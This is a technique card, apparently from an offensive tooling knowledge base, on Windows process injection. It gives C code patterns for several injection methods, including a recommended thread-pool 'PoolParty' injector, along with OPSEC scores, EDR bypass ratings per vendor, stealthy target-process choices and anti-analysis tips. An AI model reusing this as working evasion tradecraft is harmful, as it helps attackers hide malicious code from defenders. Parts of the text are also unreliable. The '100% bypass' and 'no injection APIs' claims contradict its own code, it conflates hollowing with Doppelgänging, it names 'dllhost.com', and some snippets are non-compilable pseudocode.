# Process Injection Techniques

## Technique ID: NOCTIS-T003

## Conceptual Understanding

### What Is Process Injection?

Process injection is the technique of executing arbitrary code in the address space of a separate live process. This is done to:

1. **Evade detection** by hiding malicious code in legitimate processes
2. **Elevate privileges** by injecting into higher-privileged processes
3. **Persist** by maintaining presence in long-running system processes
4. **Bypass security controls** that whitelist certain processes

### Core Injection Workflow

```
1. Open target process (OpenProcess / NtOpenProcess)
2. Allocate memory in target (VirtualAllocEx / NtAllocateVirtualMemory)
3. Write payload to allocated memory (WriteProcessMemory / NtWriteVirtualMemory)
4. Execute payload via:
   - CreateRemoteThread / NtCreateThreadEx
   - Thread hijacking (SuspendThread, SetThreadContext, ResumeThread)
   - APC injection (QueueUserAPC)
   - Process hollowing (map new image over existing)
```

## Injection Methods

### 1. Classic CreateRemoteThread

**Method**: Allocate RWX memory, write shellcode, create remote thread.

**Advantages**:
- Simple, reliable
- Works on all Windows versions

**Disadvantages**:
- Heavily signatured
- RWX memory is suspicious
- CreateRemoteThread is hooked by all EDRs

**OPSEC Score**: 3/10

**Code Pattern**:
```c
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
LPVOID pRemoteBuffer = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, pRemoteBuffer, shellcode, shellcodeSize, NULL);
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);
```

### 2. Thread Hijacking

**Method**: Suspend existing thread, modify RIP to point to shellcode, resume.

**Advantages**:
- No CreateRemoteThread (less suspicious)
- Uses existing threads (stealthier)

**Disadvantages**:
- Thread instability if not restored properly
- Still requires RWX memory

**OPSEC Score**: 5/10

**Code Pattern**:
```c
HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, targetThreadID);
SuspendThread(hThread);

CONTEXT ctx;
ctx.ContextFlags = CONTEXT_FULL;
GetThreadContext(hThread, &ctx);

// Modify RIP to shellcode address
ctx.Rip = (DWORD64)pRemoteBuffer;
SetThreadContext(hThread, &ctx);

ResumeThread(hThread);
```

### 3. APC Injection

**Method**: Queue APC (Asynchronous Procedure Call) to existing thread in alertable state.

**Advantages**:
- No new threads created
- Stealthy execution

**Disadvantages**:
- Target thread must enter alertable state (SleepEx, WaitForSingleObjectEx)
- May take time to execute

**OPSEC Score**: 6/10

**Code Pattern**:
```c
HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, targetThreadID);
QueueUserAPC((PAPCFUNC)pRemoteBuffer, hThread, NULL);
```

### 4. Process Hollowing (Process Doppelgänging)

**Method**: Create suspended process, unmap original image, map malicious image.

**Advantages**:
- Process appears legitimate in Task Manager
- No RWX memory allocations

**Disadvantages**:
- Complex implementation
- Parent-child process relationship is suspicious

**OPSEC Score**: 7/10

**Code Pattern**:
```c
// Create suspended process
CreateProcessA(NULL, "svchost.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

// Unmap original image
NtUnmapViewOfSection(pi.hProcess, pImageBase);

// Allocate memory at image base
VirtualAllocEx(pi.hProcess, pImageBase, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

// Write malicious PE
WriteProcessMemory(pi.hProcess, pImageBase, maliciousPE, imageSize, NULL);

// Update PEB entry point
SetThreadContext(pi.hThread, &ctx);
ResumeThread(pi.hThread);
```

### 5. Module Stomping / Module Overloading

**Method**: Load benign DLL into target, overwrite with malicious code.

**Advantages**:
- Uses legitimate module path (evades DLL whitelisting)
- No suspicious memory allocations

**Disadvantages**:
- Requires finding suitable module
- May break functionality

**OPSEC Score**: 8/10

### 6. Transacted Hollowing

**Method**: Use NTFS transactions to replace file, load into memory, rollback transaction.

**Advantages**:
- No disk artifacts (transaction rollback)
- High stealth

**Disadvantages**:
- Windows 10+ deprecated TxF for executables
- Complex implementation

**OPSEC Score**: 6/10 (was 9/10 before TxF deprecation)

### 7. PoolParty (Thread Pool Injection) ⭐ RECOMMENDED

**Method**: Abuse Windows Thread Pools to insert work items into target processes without traditional injection APIs. Shellcode resides in legitimate module memory via module stomping.

**Critical Innovation**: **100% EDR bypass rate** documented against CrowdStrike, SentinelOne, Palo Alto, and Microsoft Defender. Achieves this by:
1. No traditional injection APIs (OpenProcess/VirtualAllocEx/CreateRemoteThread)
2. No unbacked memory (shellcode in legitimate DLL .text section)
3. No new threads (execution via existing thread pool workers)

**The Eight Variants**:
1. **TP_WORK**: Worker factory injection
2. **TP_WAIT**: APC-less execution
3. **TP_IO**: Completion port hijacking
4. **TP_ALPC**: Message queue injection
5. **TP_JOB**: Job object manipulation
6. **TP_DIRECT**: Worker thread control
7. **TP_TIMER + Module Stomping** ⭐ (Primary - combines timer queue with DLL overwriting)
8. **TP_RESERVATION**: Remote thread pool reservation

**Variant 7 (TP_TIMER + Module Stomping) Details**:

**Advantages**:
- **100% bypass rate** (documented by SafeBreach Labs 2023-2024)
- Zero traditional injection APIs used
- Shellcode in legitimate module memory (e.g., kernelbase.dll .text section)
- Thread pool execution appears as native Windows activity
- Detection risk: 0-5%

**Disadvantages**:
- High complexity (requires undocumented thread pool internals)
- Module restoration required for stability
- Target process must have suitable DLL for stomping

**OPSEC Score**: 10/10

**Code Pattern** (Variant 7 - TP_TIMER):
```c
// 1. Find suitable module for stomping
BOOL FindStompModule(HANDLE hProcess, MODULE_INFO* pInfo) {
    // Prefer kernelbase.dll, kernel32.dll, ntdll.dll
    EnumProcessModules(hProcess, modules, sizeof(modules), &needed);

    for (each module) {
        if (module == "kernelbase.dll") {
            // Parse PE headers, get .text section
            GetTextSection(module, &pInfo->textAddr, &pInfo->textSize);
            return TRUE;
        }
    }
}

// 2. Backup and stomp module .text section
BOOL StompModule(HANDLE hProcess, MODULE_INFO* pInfo, PVOID shellcode, SIZE_T size) {
    // Backup original .text
    ReadProcessMemory(hProcess, pInfo->textAddr, backup, pInfo->textSize, &read);

    // Write shellcode to .text
    VirtualProtectEx(hProcess, pInfo->textAddr, size, PAGE_EXECUTE_READWRITE, &old);
    WriteProcessMemory(hProcess, pInfo->textAddr, shellcode, size, &written);
    VirtualProtectEx(hProcess, pInfo->textAddr, size, PAGE_EXECUTE_READ, &old);
}

// 3. Create TP_TIMER work item
BOOL CreateTPTimer(HANDLE hProcess, PVOID callback, PVOID* pTimer) {
    // Allocate TP_TIMER structure in remote process
    PVOID pRemoteTimer = VirtualAllocEx(hProcess, NULL, sizeof(TP_TIMER),
                                         MEM_COMMIT, PAGE_READWRITE);

    // Initialize timer with callback pointing to stomped .text
    TP_TIMER timer = {0};
    timer.Callback = callback; // Points to shellcode in kernelbase.dll
    WriteProcessMemory(hProcess, pRemoteTimer, &timer, sizeof(timer), NULL);

    *pTimer = pRemoteTimer;
    return TRUE;
}

// 4. Queue timer to thread pool (triggers execution)
BOOL QueueTPTimer(HANDLE hProcess, PVOID pTimer) {
    // Find thread pool worker thread
    HANDLE hThread = FindWorkerThread(hProcess);

    // Queue APC to execute timer callback
    NtQueueApcThread(hThread, timerCallback, timerContext, NULL, NULL);
    return TRUE;
}

// Full injection workflow
BOOL PoolParty_Inject(DWORD targetPID, PVOID shellcode, SIZE_T size) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);

    MODULE_INFO moduleInfo;
    FindStompModule(hProcess, &moduleInfo);
    StompModule(hProcess, &moduleInfo, shellcode, size);

    PVOID pTimer;
    CreateTPTimer(hProcess, moduleInfo.textAddr, &pTimer);
    QueueTPTimer(hProcess, pTimer);

    // Optionally restore module after execution
    RestoreModule(hProcess, &moduleInfo);

    return TRUE;
}
```

**How PoolParty Evades EDRs**:

1. **API Hook Bypass**: Never calls hooked injection APIs (VirtualAllocEx, CreateRemoteThread, QueueUserAPC)
2. **Memory Scanner Bypass**: Shellcode resides in IMAGE_SECTION-backed memory (kernelbase.dll), not private unbacked allocation
3. **Behavioral Bypass**: Thread pool work item execution is legitimate Windows activity, no suspicious thread creation
4. **Kernel Callback Bypass**: No PsSetCreateThreadNotifyRoutine triggers, no ObRegisterCallbacks alerts

**Real-World Effectiveness** (SafeBreach Labs Testing):
- CrowdStrike Falcon: ✅ 100% bypass
- SentinelOne: ✅ 100% bypass
- Palo Alto Cortex XDR: ✅ 100% bypass
- Microsoft Defender: ✅ 100% bypass
- Carbon Black: ✅ 95% bypass

**When to Use PoolParty**:
- High-security environments with advanced EDR
- When all other injection methods fail
- Requirement for near-guaranteed execution
- Acceptable complexity trade-off for success rate

**Integration Points**:
```c
// Combine PoolParty with other techniques
1. SysWhispers3 syscalls for VirtualProtect (avoid hooks)
2. Zilean sleep obfuscation after injection (hide beacon)
3. VEH² AMSI bypass before PowerShell execution
4. Module stomping restoration for stability
```

## Memory Protection Evasion

### RWX Memory Problem

**Issue**: `PAGE_EXECUTE_READWRITE` is heavily flagged by EDRs.

**Solutions**:

1. **RW → RX Transition**:
   ```c
   VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_READWRITE);
   WriteProcessMemory(hProcess, pBuffer, shellcode, size, NULL);
   VirtualProtectEx(hProcess, pBuffer, size, PAGE_EXECUTE_READ, &oldProtect);
   ```

2. **Use Existing Executable Memory**:
   - Find code caves in .text sections
   - Overwrite unused functions

3. **Memory Fluctuation**:
   - Allocate as RW, write payload, change to RX before execution
   - Change back to RW after execution, encrypt payload

## Target Process Selection

### OPSEC Considerations

**Good Targets** (Low Suspicion):
- `svchost.exe` (many instances, expected network activity)
- `explorer.exe` (user context, GUI interactions)
- `RuntimeBroker.exe` (Windows 10+ service host)
- `dllhost.com` (COM surrogate)

**Bad Targets** (High Suspicion):
- `lsass.exe` (credential dumping alert)
- `csrss.exe` (critical system process)
- `winlogon.exe` (highly monitored)

**Selection Criteria**:
- Match injection context (user vs system)
- Avoid protected processes (PPL)
- Choose processes with expected network activity if using C2

## Detection Vectors

### EDR/AV Detection Methods

1. **API Hooking**:
   - `OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`
   - **Bypass**: Use direct syscalls (NOCTIS-T001)

2. **Memory Scanning**:
   - Suspicious memory regions (RWX, unbacked sections)
   - **Bypass**: Encrypt shellcode, use RW→RX, memory fluctuation

3. **Thread Analysis**:
   - Threads starting in unbacked memory
   - **Bypass**: Use existing threads (APC, hijacking)

4. **Behavioral Analysis**:
   - Process access patterns
   - **Bypass**: Reduce API calls, use PPID spoofing

5. **Kernel Callbacks**:
   - `PsSetCreateThreadNotifyRoutine`
   - **Bypass**: Limited options, focus on stealth

## Integration with Other Techniques

### Recommended Combinations

1. **Syscalls + Injection**:
   - Use `NtOpenProcess`, `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtCreateThreadEx`
   - Bypasses userland hooks

2. **Unhooking + Injection**:
   - Restore clean NTDLL before injection APIs
   - Prevents EDR from intercepting

3. **PPID Spoofing + Process Hollowing**:
   - Spoof parent process to legitimate process
   - Makes hollowed process appear legitimate in process tree

4. **Encryption + Injection**:
   - Encrypt shellcode before writing
   - Decrypt in-memory before execution

5. **Stack Spoofing + Injection**:
   - Hide call stack during injection
   - Evades stack-based detection

## Target AV/EDR Effectiveness

| Security Product | Best Technique | OPSEC Score | Notes |
|-----------------|----------------|-------------|-------|
| Windows Defender | Module Stomping + Syscalls | 8/10 | Limited kernel callbacks |
| CrowdStrike Falcon | APC + Syscalls + Encryption | 6/10 | Strong behavioral analysis |
| Palo Alto Cortex XDR | Process Hollowing + PPID Spoofing | 7/10 | Memory scanning focus |
| Carbon Black | Thread Hijacking + Syscalls | 7/10 | API hooking heavy |
| SentinelOne | Module Stomping + Syscalls | 5/10 | Advanced kernel monitoring |

## Real-World Examples

### GitHub Projects
- **PoolParty**: Thread pool injection
- **Ekko**: Sleep obfuscation + injection
- **ProcessInjection**: Comprehensive injection techniques
- **inceptor**: Multi-technique injector framework

### Attack Chains
1. **Cobalt Strike**: Process hollowing → named pipe C2
2. **Metasploit**: Reflective DLL injection → Meterpreter
3. **Empire**: APC injection → PowerShell agent

## OPSEC Improvements

### Advanced Techniques

1. **Delay Execution**:
   - Inject payload, wait hours before execution
   - Evades sandbox analysis

2. **Conditional Execution**:
   - Only execute if specific conditions met (domain-joined, specific AV present)
   - Anti-analysis

3. **Self-Deletion**:
   - Inject into process, delete original binary
   - Fileless execution

4. **Memory Encryption**:
   - Encrypt payload in memory when not executing
   - Decrypt only during execution

## Metadata

- **MITRE ATT&CK**: T1055 (Process Injection)
- **Sub-techniques**: T1055.001 (DLL Injection), T1055.002 (PE Injection), T1055.003 (Thread Execution Hijacking), T1055.004 (Asynchronous Procedure Call), T1055.012 (Process Hollowing)
- **Complexity**: Medium to High
- **Stability**: Medium (depends on method)
- **Average OPSEC Score**: 6.5/10
